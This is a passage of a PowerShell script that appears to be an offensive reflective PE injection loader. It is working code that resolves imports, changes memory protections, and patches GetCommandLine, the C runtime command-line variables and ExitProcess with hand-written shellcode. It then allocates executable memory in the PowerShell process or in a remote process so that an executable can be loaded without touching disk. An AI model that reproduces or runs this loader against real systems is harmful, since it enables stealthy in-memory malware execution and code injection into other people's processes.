					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
